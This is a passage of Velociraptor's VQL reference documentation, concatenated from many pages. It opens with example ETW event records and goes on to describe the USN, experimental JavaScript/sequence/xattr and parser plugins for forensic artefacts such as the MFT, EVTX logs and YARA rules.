    "OpenPath": "C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Code Cache\\js\\5926f528a1f0ddd3_0"
  },
  "Backtrace": [
    "fileinfo.sys!0x11107",
    "ntoskrnl.exe!IofCallDriver",
    "ntoskrnl.exe!SePrivilegeCheck",
    "ntoskrnl.exe!_setjmpex",
    "ntdll.dll!NtCreateFile",
    "KernelBase.dll!CreateFileW",
    "chrome.dll!0x55bc08",
    "chrome.dll!0x834d17",
    "chrome.dll!IsSandboxedProcess",
    "chrome.dll!IsSandboxedProcess",
    "chrome.dll!0xae178",
    "chrome.dll!0x966030",
    "kernel32.dll!BaseThreadInitThunk",
    "ntdll.dll!RtlUserThreadStart"
  ]
},
```

The following is an example of an outbound connection over port 22.
```json
 {
   "System": {
     "ID": 0,
     "ProcessID": 4294967295,
     "TimeStamp": "2025-01-02T06:27:38.6957971Z",
     "Provider": "{9A280AC0-C8E0-11D1-84E2-00C04FB998A2}",
     "OpCode": 12,
     "KernelEventType": "ConnectTCPv4"
   },
   "EventData": {
     "PID": "1748",
     "size": "0",
     "daddr": "192.168.0.2",
     "saddr": "192.168.1.237",
     "dport": "22",
     "sport": "50068",
     "mss": "1460",
     "sackopt": "1",
     "tsopt": "0",
     "wsopt": "1",
     "rcvwin": "2098020",
     "rcvwinscale": "8",
     "sndwinscale": "7",
     "seqnum": "0",
     "connid": null
   },
}
```



---END OF FILE---

======
FILE: /content/vql_reference/event/watch_usn/_index.md
======
---
title: watch_usn
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_usn
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
device|The device file to open (as an NTFS device).|string (required)

### Description

Watch the USN journal from a device.


---END OF FILE---

======
FILE: /content/vql_reference/experimental/_index.md
======
---
title: Experimental
weight: 80
linktitle: Experimental
index: true
no_edit: true
no_children: true
---

Velociraptor is evolving quickly. We sometimes implement functionality which
may not be broadly useful and therefore might not remain in Velociraptor for
the long-term. This page lists such 'experimental' features.

If you find them useful, please let us know so that we don't remove them!
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[js](js)|<span class='vql_type'>Function</span>|Compile and run javascript code|
|[js_call](js_call)|<span class='vql_type'>Function</span>|Compile and run javascript code|
|[js_get](js_get)|<span class='vql_type'>Function</span>|Get a variable's value from the JS VM|
|[js_set](js_set)|<span class='vql_type'>Function</span>|Set a variables value in the JS VM|
|[sequence](sequence)|<span class='vql_type'>Plugin</span>|Combines the output of many queries into an in memory fifo|
|[xattr](xattr)|<span class='vql_type'>Function</span>|Query a file for the specified extended attribute|

---END OF FILE---

======
FILE: /content/vql_reference/experimental/js_get/_index.md
======
---
title: js_get
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## js_get
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
var|The variable to get from the JS VM.|string (required)
key|If set use this key to cache the JS VM.|string

### Description

Get a variable's value from the JS VM.


---END OF FILE---

======
FILE: /content/vql_reference/experimental/js/_index.md
======
---
title: js
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## js
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
js|The body of the javascript code.|string (required)
key|If set use this key to cache the JS VM.|string

### Description

Compile and run javascript code.


---END OF FILE---

======
FILE: /content/vql_reference/experimental/js_set/_index.md
======
---
title: js_set
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## js_set
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
var|The variable to set inside the JS VM.|string (required)
value|The value to set inside the VM.|Any (required)
key|If set use this key to cache the JS VM.|string

### Description

Set a variables value in the JS VM.


---END OF FILE---

======
FILE: /content/vql_reference/experimental/js_call/_index.md
======
---
title: js_call
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## js_call
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
func|JS function to call.|string (required)
args|Positional args for the function.|Any
key|If set use this key to cache the JS VM.|string

### Description

Compile and run javascript code.


---END OF FILE---

======
FILE: /content/vql_reference/experimental/xattr/_index.md
======
---
title: xattr
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## xattr
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|Filename to inspect.|OSPath (required)
attribute|Attribute to collect. |list of string
accessor|File accessor|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Query a file for the specified extended attribute.

If no attributes are provided, this function will return all extended attributes
for the file.

Please note: this API is not reliable, so please provided extended attributes
where possible.

Note: This function only works on Mac and Linux.



---END OF FILE---

======
FILE: /content/vql_reference/experimental/sequence/_index.md
======
---
title: sequence
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sequence
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|Run this query to generate rows. The query should select from SEQUENCE which will contain the current set of rows in the sequence. The query will be run on each new row that is pushed to the sequence.|StoredQuery (required)
max_age|Maximum number of seconds to hold rows in the sequence.|int64

### Description

Combines the output of many queries into an in memory fifo. After
each row is received from any subquery runs the query specified in
the 'query' parameter to retrieve rows from the memory SEQUENCE
object.

The `sequence()` plugin is very useful to correlate temporally close
events from multiple queries - for example, say a process execution
query and a network query. The `query` can then search for relevant
network event closely followed by a process event.

### Example

```vql
SELECT * FROM sequence(
network={
  SELECT * FROM Artifact.Windows.ETW.DNS()
  WHERE Query =~ "github"
},
process={
  SELECT * FROM Artifact.Windows.Detection.WMIProcessCreation()
  WHERE Name =~ "cmd.exe"
},
query={
  SELECT Name, CommandLine, {  -- search for a DNS lookup
    SELECT * FROM SEQUENCE
    WHERE Query =~ "github"
  } AS DNSInfo
  FROM SEQUENCE
  WHERE DNSInfo AND Name
})
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/_index.md
======
---
title: Parsers
weight: 50
linktitle: Parsers
index: true
no_edit: true
no_children: true
---

Many Velociraptor artifacts rely on parsing of file and data formats.

Velociraptor has dedicated parsers for some specialized file and data
formats. In addition we have flexible generic parsers, such as `grok` and
other regex-based parsers for text formats, and `parse_binary` which
provides completely customizable parsing of binary file formats.
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[carve_usn](carve_usn)|<span class='vql_type'>Plugin</span>|Carve for the USN journal entries from a device|
|[commandline_split](commandline_split)|<span class='vql_type'>Function</span>|Split a commandline into separate components following the windows|
|[grok](grok)|<span class='vql_type'>Function</span>|Parse a string using a Grok expression|
|[leveldb](leveldb)|<span class='vql_type'>Plugin</span>|Enumerate all items in a level db database|
|[olevba](olevba)|<span class='vql_type'>Plugin</span>|Extracts VBA Macros from Office documents|
|[parse_auditd](parse_auditd)|<span class='vql_type'>Plugin</span>|Parse log files generated by auditd|
|[parse_binary](parse_binary)|<span class='vql_type'>Function</span>|Parse a binary file into a data structure using a profile|
|[parse_csv](parse_csv)|<span class='vql_type'>Plugin</span>|Parses events from a CSV file|
|[parse_ese](parse_ese)|<span class='vql_type'>Plugin</span>|Opens an ESE file and dump a table|
|[parse_ese_catalog](parse_ese_catalog)|<span class='vql_type'>Plugin</span>|Opens an ESE file and dump the schema|
|[parse_evtx](parse_evtx)|<span class='vql_type'>Plugin</span>|Parses events from an EVTX file|
|[parse_float](parse_float)|<span class='vql_type'>Function</span>|Convert a string to a float|
|[parse_journald](parse_journald)|<span class='vql_type'>Plugin</span>|Parse a journald file|
|[parse_json](parse_json)|<span class='vql_type'>Function</span>|Parse a JSON string into an object|
|[parse_json_array](parse_json_array)|<span class='vql_type'>Function</span>|Parse a JSON string into an array|
|[parse_json_array](parse_json_array)|<span class='vql_type'>Plugin</span>|Parses events from a line oriented json file|
|[parse_jsonl](parse_jsonl)|<span class='vql_type'>Plugin</span>|Parses a line oriented json file|
|[parse_lines](parse_lines)|<span class='vql_type'>Plugin</span>|Parse a file separated into lines|
|[parse_mft](parse_mft)|<span class='vql_type'>Plugin</span>|Scan the $MFT from an NTFS volume|
|[parse_ntfs](parse_ntfs)|<span class='vql_type'>Function</span>|Parse specific inodes from an NTFS image file or the raw device|
|[parse_ntfs_i30](parse_ntfs_i30)|<span class='vql_type'>Plugin</span>|Scan the $I30 stream from an NTFS MFT entry|
|[parse_ntfs_ranges](parse_ntfs_ranges)|<span class='vql_type'>Plugin</span>|Show the run ranges for an NTFS stream|
|[parse_pe](parse_pe)|<span class='vql_type'>Function</span>|Parse a PE file|
|[parse_pkcs7](parse_pkcs7)|<span class='vql_type'>Function</span>|Parse a DER encoded pkcs7 string into an object|
|[parse_records_with_regex](parse_records_with_regex)|<span class='vql_type'>Plugin</span>|Parses a file with a set of regexp and yields matches as records|
|[parse_recyclebin](parse_recyclebin)|<span class='vql_type'>Plugin</span>|Parses a $I file found in the $Recycle|
|[parse_string_with_regex](parse_string_with_regex)|<span class='vql_type'>Function</span>|Parse a string with a set of regex and extract fields|
|[parse_usn](parse_usn)|<span class='vql_type'>Plugin</span>|Parse the USN journal from a device, image file or USN file|
|[parse_x509](parse_x509)|<span class='vql_type'>Function</span>|Parse a DER encoded x509 string into an object|
|[parse_xml](parse_xml)|<span class='vql_type'>Function</span>|Parse an XML document into a dict like object|
|[parse_yaml](parse_yaml)|<span class='vql_type'>Function</span>|Parse yaml into an object|
|[path_split](path_split)|<span class='vql_type'>Function</span>|Split a path into components|
|[pathspec](pathspec)|<span class='vql_type'>Function</span>|Create a structured path spec to pass to certain accessors|
|[plist](plist)|<span class='vql_type'>Plugin</span>|Parses a plist file|
|[prefetch](prefetch)|<span class='vql_type'>Plugin</span>|Parses a prefetch file|
|[regex_replace](regex_replace)|<span class='vql_type'>Function</span>|Search and replace a string with a regexp|
|[relpath](relpath)|<span class='vql_type'>Function</span>|Return the relative path of |
|[split_records](split_records)|<span class='vql_type'>Plugin</span>|Parses files by splitting lines into records|
|[sqlite](sqlite)|<span class='vql_type'>Plugin</span>|Opens an SQLite file and run a query against it|
|[starl](starl)|<span class='vql_type'>Function</span>|Compile a starlark code block - returns a module usable in VQL|
|[yara](yara)|<span class='vql_type'>Plugin</span>|Scan files using yara rules|
|[yara_lint](yara_lint)|<span class='vql_type'>Function</span>|Clean a set of yara rules|

---END OF FILE---

======
FILE: /content/vql_reference/parsers/regex_replace/_index.md
======
---
title: regex_replace
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## regex_replace
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
source|The source string to replace.|string (required)
replace|The substitute string.|string
replace_lambda|Optionally the replacement can be a lambda.|string
re|A regex to apply|string (required)

### Description

Search and replace a string with a regexp. Note you can use $1 to replace the capture string.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_yaml/_index.md
======
---
title: parse_yaml
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_yaml
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|Yaml Filename|OSPath (required)
accessor|File accessor|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parse yaml into an object.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_journald/_index.md
======
---
title: parse_journald
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_journald
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of journal log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string
raw|Emit raw events (not parsed).|bool
start_time|Only parse events newer than this time (default all times).|time.Time
end_time|Only parse events older than this time (default all times).|time.Time

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parse a journald file.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_ese/_index.md
======
---
title: parse_ese
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_ese
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file||OSPath (required)
accessor|The accessor to use.|string
table|A table name to dump|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Opens an ESE file and dump a table.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_json_array/_index.md
======
---
title: parse_json_array
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_json_array
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
data|Json encoded string.|string (required)

### Description

Parse a JSON string into an array.

This function is similar to `parse_json()` but works for a JSON list
instead of an object.




<div class="vql_item"></div>


## parse_json_array
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
data|Json encoded string.|string (required)

### Description

Parses events from a line oriented json file.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_recyclebin/_index.md
======
---
title: parse_recyclebin
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_recyclebin
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|Files to be parsed.|list of OSPath (required)
accessor|The accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parses a $I file found in the $Recycle.Bin


---END OF FILE---

======
FILE: /content/vql_reference/parsers/path_split/_index.md
======
---
title: path_split
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## path_split
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Path to split into components.|Any (required)
path_type|Type of path (e.g. 'windows')|string

### Description

Split a path into components. Note this is more complex than just split() because it takes into account path escaping.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_mft/_index.md
======
---
title: parse_mft
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_mft
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|The MFT file.|OSPath (required)
accessor|The accessor to use.|string
prefix|If specified we prefix all paths with this path.|OSPath
start|The first entry to scan.|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Scan the $MFT from an NTFS volume.

This plugin expect an $MFT file to operate on. For example, it is
commonly used with the 'ntfs' accessor which opens the local raw
device to provide access to the $MFT

```vql
SELECT * FROM parse_mft(filename="C:/$MFT", accessor="ntfs")
```

For parsing from an image file, you can extract the $MFT file
using the raw_ntfs accessor (which operates on images).

```vql
SELECT * FROM parse_mft(
     filename=pathspec(
       Path="$MFT",
       DelegateAccessor="file",
       DelegatePath='ntfs_image.dd'),
     accessor="raw_ntfs")
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_evtx/_index.md
======
---
title: parse_evtx
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_evtx
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of event log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string
messagedb|A Message database from https://github.com/Velocidex/evtx-data.|string
workers|If specified we use this many workers to parse the file in parallel (default 1).|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parses events from an EVTX file.

This plugin parses windows events from the Windows Event log files (EVTX).

A windows event typically contains two columns. The `EventData`
contains event specific structured data while the `System` column
contains common data for all events - including the Event ID.

You should probably almost always filter by one or more event ids
(using the `System.EventID.Value` field).

### Example

```vql
SELECT System.TimeCreated.SystemTime as Timestamp,
       System.EventID.Value as EventID,
       EventData.ImagePath as ImagePath,
       EventData.ServiceName as ServiceName,
       EventData.ServiceType as Type,
       System.Security.UserID as UserSID,
       EventData as _EventData,
       System as _System
FROM watch_evtx(filename=systemLogFile) WHERE EventID = 7045
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/grok/_index.md
======
---
title: grok
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## grok
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
grok|Grok pattern.|string (required)
data|String to parse.|string (required)
patterns|Additional patterns.|Any
all_captures|Extract all captures.|bool

### Description

Parse a string using a Grok expression.

This is most useful for parsing syslog style logs (e.g. IIS, Apache logs).

You can read more about GROK expressions here
https://www.elastic.co/blog/do-you-grok-grok



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_ntfs_ranges/_index.md
======
---
title: parse_ntfs_ranges
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_ntfs_ranges
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
device|The device file to open. This may be a full path for example C:\Windows - we will figure out the device automatically.|string
filename|A raw image to open. You can also provide the accessor if using a raw image file.|OSPath
mft_filename|A path to a raw $MFT file to parse.|OSPath
accessor|The accessor to use.|string
inode|The MFT entry to parse in inode notation (5-144-1).|string
mft|The MFT entry to parse.|int64
mft_offset|The offset to the MFT entry to parse.|int64

### Description

Show the run ranges for an NTFS stream.

Note: You can also use a raw $MFT file to operate on - see
`parse_ntfs()` for a full description.



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_lines/_index.md
======
---
title: parse_lines
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_lines
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string
buffer_size|Maximum size of line buffer.|int

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parse a file separated into lines.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/olevba/_index.md
======
---
title: olevba
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## olevba
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|A list of filenames to open as OLE files.|list of OSPath (required)
accessor|The accessor to use.|string
max_size|Maximum size of file we load into memory.|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Extracts VBA Macros from Office documents.

This plugin parses the provided files as OLE documents in order to
recover VB macro code. A single document can have multiple code
objects, and each such code object is emitted as a row.



---END OF FILE---

======
FILE: /content/vql_reference/parsers/split_records/_index.md
======
---
title: split_records
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## split_records
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filenames|Files to parse.|list of OSPath (required)
accessor|The accessor to use|string
regex|The split regular expression (e.g. a comma, default whitespace)|string
columns|If the first row is not the headers, this arg must provide a list of column names for each value.|list of string
first_row_is_headers|A bool indicating if we should get column names from the first row.|bool
count|Only split into this many columns if possible.|int
record_regex|A regex to split data into records (default |string
buffer_size|Maximum size of line buffer (default 64kb).|int

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parses files by splitting lines into records.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_records_with_regex/_index.md
======
---
title: parse_records_with_regex
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_records_with_regex
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|A list of files to parse.|list of OSPath (required)
regex|A list of regex to apply to the file data.|list of string (required)
accessor|The accessor to use.|string
buffer_size|Maximum size of line buffer (default 64kb).|int

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parses a file with a set of regexp and yields matches as records.  The
file is read into a large buffer. Then each regular expression is
applied to the buffer, and all matches are emitted as rows.

The regular expressions are specified in the [Go
syntax](https://golang.org/pkg/regexp/syntax/). They are expected to
contain capture variables to name the matches extracted.

For example, consider a HTML file with simple links. The regular
expression might be:

```
regex='<a.+?href="(?P<Link>[^"]+?)"'
```

To produce rows with a column Link.

The aim of this plugin is to split the file into records which can be
further parsed. For example, if the file consists of multiple records,
this plugin can be used to extract each record, while
parse_string_with_regex() can be used to further split each record
into elements. This works better than trying to write a more complex
regex which tries to capture a lot of details in one pass.


### Example

Here is an example of parsing the /var/lib/dpkg/status files. These
files consist of records separated by empty lines:

```
Package: ubuntu-advantage-tools
Status: install ok installed
Priority: important
Section: misc
Installed-Size: 74
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Architecture: all
Version: 17
Conffiles:
 /etc/cron.daily/ubuntu-advantage-tools 36de53e7c2d968f951b11c64be101b91
 /etc/update-motd.d/80-esm 6ffbbf00021b4ea4255cff378c99c898
 /etc/update-motd.d/80-livepatch 1a3172ffaa815d12b58648f117ffb67e
Description: management tools for Ubuntu Advantage
 Ubuntu Advantage is the professional package of tooling, technology
 and expertise from Canonical, helping organizations around the world
 manage their Ubuntu deployments.
 .
 Subscribers to Ubuntu Advantage will find helpful tools for accessing
 services in this package.
Homepage: https://buy.ubuntu.com
```

The following query extracts the fields in two passes. The first pass
uses parse_records_with_regex() to extract records in blocks, while
using parse_string_with_regex() to further break the block into
fields.

```vql
SELECT parse_string_with_regex(
   string=Record,
   regex=['Package:\\s(?P<Package>.+)',
     'Installed-Size:\\s(?P<InstalledSize>.+)',
     'Version:\\s(?P<Version>.+)',
     'Source:\\s(?P<Source>.+)',
     'Architecture:\\s(?P<Architecture>.+)']) as Record
   FROM parse_records_with_regex(
     file=linuxDpkgStatus,
     regex='(?sm)^(?P<Record>Package:.+?)\\n\\n')
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_binary/_index.md
======
---
title: parse_binary
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_binary
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|Binary file to open.|OSPath (required)
accessor|The accessor to use|string
profile|Profile to use (see https://github.com/Velocidex/vtypes).|string
struct|Name of the struct in the profile to instantiate.|string (required)
offset|Start parsing from this offset|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parse a binary file into a data structure using a profile.

This plugin extract binary data from strings. It works by applying
a profile to the binary string and generating an object from
that. Profiles are a json structure describing the binary format. For
example a profile might be:

```json
[
  ["StructName", 10, [
     ["field1", 2, "unsigned int"],
     ["field2", 6, "unsigned long long"],
   ]]]
]
```

The profile is compiled and overlaid on top of the offset specified,
then the object is emitted with its required fields.

Please refer to [Binary
Parsing](https://docs.velociraptor.app/docs/forensic/binary/) for
a background in parsing binary data for forensic purposes and for
instructions on how to construct profiles like the example above.

More detailed information about profiles and their implementation
can be found in the [vfilter](https://github.com/Velocidex/vtypes)
module documentation.



---END OF FILE---

======
FILE: /content/vql_reference/parsers/pathspec/_index.md
======
---
title: pathspec
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## pathspec
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
DelegateAccessor|An accessor to use.|string
DelegatePath|A delegate to pass to the accessor.|string
Path|A path to open.|Any
parse|Alternatively parse the pathspec from this string.|string
path_type|Type of path this is (windows,linux,registry,ntfs).|string
accessor|The accessor to use to parse the path with|string

### Description

Create a structured path spec to pass to certain accessors.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/relpath/_index.md
======
---
title: relpath
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## relpath
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Extract directory name of path|string (required)
base|The base of the path|string (required)
sep|Separator to use (default native)|string

### Description

Return the relative path of .


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_pkcs7/_index.md
======
---
title: parse_pkcs7
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_pkcs7
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
data|PKCS7 DER encoded string.|string (required)

### Description

Parse a DER encoded pkcs7 string into an object.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/yara_lint/_index.md
======
---
title: yara_lint
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## yara_lint
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
rules|A string containing Yara Rules.|string (required)
clean|Remove metadata to make rules smaller.|bool

### Description

Clean a set of yara rules. This removes invalid or unsupported rules.

Velociraptor's yara implementation does not support all the
modules available in Yara - specifically we do not support modules
that require OpenSSL. Sometimes rules that include conditions that
call these unsupported modules are mixed in with many other
supported rules.

This function lints the rules in a yara rule set and removes rules
which are not supported. The function also automatically adds yara
imports if they are used by any of the rules.

Additionally, providing the `clean` parameter will also remove all
the metadata from rules to save space and execution memory for
large rule sets.

You can run this function on the server to produce a smaller rule set
(removing the metadata etc). Alternatively you can modify your yara
artifacts to prefilter the rules with it before loading into the
[yara]({{< ref "/vql_reference/parsers/yara/" >}})
plugin.

### Example

```vql
LET rules <= SELECT OSPath AS rule_file,
                    read_file(filename=OSPath) AS original_rule,
                    yara_lint(rules=read_file(filename=OSPath)) AS linted_rule,
                    yara_lint(rules=read_file(filename=OSPath), clean=TRUE) AS cleaned_rule
  FROM glob(globs="/home/me/code/intezer/yara-rules/*.yar")

-- Show the individually linted rules
SELECT * FROM rules

-- Combine the rules and write to a single yar file.
-- We run yara_lint a 2nd time to get the imports at the beginning of the
-- combined file, although you could combine the rules first and then lint them.
SELECT copy(
        accessor="data",
        filename=yara_lint(
          rules=join(
            array=rules.cleaned_rule,
            sep="\n\n")),
        dest="/tmp/cleaned_rules.yar") AS cleaned_output
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_ntfs_i30/_index.md
======
---
title: parse_ntfs_i30
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_ntfs_i30
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
device|The device file to open. This may be a full path for example C:\Windows - we will figure out the device automatically.|string
filename|A raw image to open. You can also provide the accessor if using a raw image file.|OSPath
mft_filename|A path to a raw $MFT file to parse.|OSPath
accessor|The accessor to use.|string
inode|The MFT entry to parse in inode notation (5-144-1).|string
mft|The MFT entry to parse.|int64
mft_offset|The offset to the MFT entry to parse.|int64

### Description

Scan the $I30 stream from an NTFS MFT entry.

This is similar in use to the parse_ntfs() function but parses the
$I30 stream.

Note: You can also use a raw $MFT file to operate on - see
`parse_ntfs()` for a full description.



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_auditd/_index.md
======
---
title: parse_auditd
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_auditd
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string
buffer_size|Maximum size of line buffer.|int

### Description

Parse log files generated by auditd.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/plist/_index.md
======
---
title: plist
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## plist
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|A list of files to parse.|list of OSPath (required)
accessor|The accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parses a plist file.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_json/_index.md
======
---
title: parse_json
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_json
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
data|Json encoded string.|string (required)

### Description

Parse a JSON string into an object.

Note that when VQL dereferences fields in a dict it returns a Null for
those fields that do not exist. Thus there is no error in actually
accessing missing fields, the column will just return nil.



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_usn/_index.md
======
---
title: parse_usn
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_usn
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
device|The device file to open.|OSPath
image_filename|A raw image to open. You can also provide the accessor if using a raw image file.|OSPath
accessor|The accessor to use.|string
